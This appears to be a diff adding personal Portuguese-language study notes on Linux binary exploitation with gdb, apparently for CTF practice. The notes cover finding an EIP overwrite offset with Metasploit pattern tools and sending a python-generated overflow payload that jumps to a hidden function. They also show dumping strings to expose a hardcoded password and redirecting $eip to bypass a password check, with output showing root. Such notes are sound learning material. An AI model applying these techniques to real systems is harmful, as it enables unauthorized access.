@@ -1,0 +1,156 @@
+PATTERNS:
+
+
+#/usr/bin/msf-pattern_create -l 150 > patlist.txt
+brakpoint
+gdb run < patlist.txt
+c
+
+#/usr/bin/msf-pattern_offset -l 150 -q 0x65413565
+[*] Exact match at offset 136
+gdb run < <(python -c 'print "A" * 136 + "BBBB"')
+
+c
+
+Se a resposta for 42424242 significa que nossos BBBB
+assumiram ou sobrescreveram EIP o que significa que
+podemos manipular a aplicacao.
+
+entao agora ao inves de BBBB vamos enviar nosso cobicado
+endereco de destino:
+
+da funcao a qual nao dinhamos acesso dentro do programa
+0x080484c0 = exploit(obtido em 'info functions')
+
+traduzimos o endereco para littleindia(De tras para frente, invertendo a ordem das palavras na frase, mas nao das letras
+nas palavras)
+
+run < <(python -c 'print "A" * 136 + "\xc0\x84\x04\x08"')
+
+
+----------------------------------------------------
+Causando Buffer Over Flow no linux
+
+gdb -q ./protegido
+
+set disassembly-flavor intel
+
+info functions
+
+disas 'funcao'
+
+disas main
+
+Em outro termianl: Ex traduzindo numeros hexa pra decimal
+python -c "print 0x84" 132bytes (mais do que 132 comeca a sobreescrever)
+
+
+No terminal do gdb:
+
+b* 0x56556270 (Break point em endereco de acessa)
+
+disas ou disas main(main talvez se chame outra funcao)
+
+i r
+
+run < <(python -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"') eh obvio que aqui teriamos que 
+descobrir o offset de eip e tals....
+
+y
+
+i r
+
+x/16xw $esp
+
+x/1x $ebp
+
+como follow in dump no immunity debugger windows
+-------------------------------------------------
+d remove o breakpoint
+
+Descobrindo senha do seu arquivo elf:
+
+gdb -q ./protegido
+
+set disassembly-flavor intel
+
+disas main (disas (funcao de jne 'verifica'))
+
+disas verifica
+
+vemos o endereco de jne da esquerda que estiver com a seta
+eh eip proxima instrucao a ser executada.
+
+selecionamos o breakpoint no endereco da funcao do assembly
+JNE.
+
+b* 0x5655626e
+
+entao apos setar nosso breakpoint rodamos o programa
+
+run depois (y)
+
+ele vai mostrar o caminho para o programa e vai pedir a senha:
+
+Nesse momento digitamos qualquer senha
+
+entao demos um disa na funcao pra ver onde estamos:
+saida
+=> endereco do brakpoint de jne
+
+Ok sendo assim executamos:
+
+x/20s $eip 
+
+(Significa ver em strings 20 bytes da proxima instrucao que eip armazena)
+
+dai voce vai ver uns treco meio bugados hexa...
+
+deixa enter pressionado, mais fique atento a tela, porque
+as strings de definicao de senha aparecerao logo mais...
+enquanto o terminal estiver correndo pelos enderecos de 
+memoria...
+
+vemos o exato registro que temos quando o programa eh
+executado, porem estamos escutando dados direto dos enderecos
+da memoria.
+
+<_fp_hw>:	"\003"
+0x56557002 <_fp_hw+2>:	""
+0x56557003 <_fp_hw+3>:	""
+0x56557004 <_IO_stdin_used>:	"\001"
+0x56557006 <_IO_stdin_used+2>:	"\002"
+0x56557008:	"Entre com a senha: "
+0x5655701c:	"123"
+0x56557020:	"Essa senha foi desativada!"
+0x5655703b:	"pr0t3g1d0"
+0x56557045:	"Acesso Negado"
+(gdb) 
+
+thanks
+-----------------------------------------------
+
+Outra coisa interessante eh que, apos parar em qualquer breakpoint, voce pode desviar o fluxo do programa pra um endereco especifico, entao usando a logica, obviamente
+voce pode dar bypass para um endereco que so seria acessado
+pelo programa se uma determinada condicao for atendida...
+
+exemplo: estamos no breakpoint (Eh como parar no tempo)
+
+i r
+
+veja o eip esta pro fluxo normal do programa
+
+set $eip = 0x56556293
+
+i r
+
+c (continue executando)
+
+aqui obtivemos algo que ele faria apos a senha certa ser digitada:
+
+Bem vindo! 
+[Detaching after vfork from child process 17179]
+uid=0(root) gid=0(root) groups=0(root)
+
+Esse ultimo truque serve mais pra ctf e senhas em arquivos baixados na web....
+
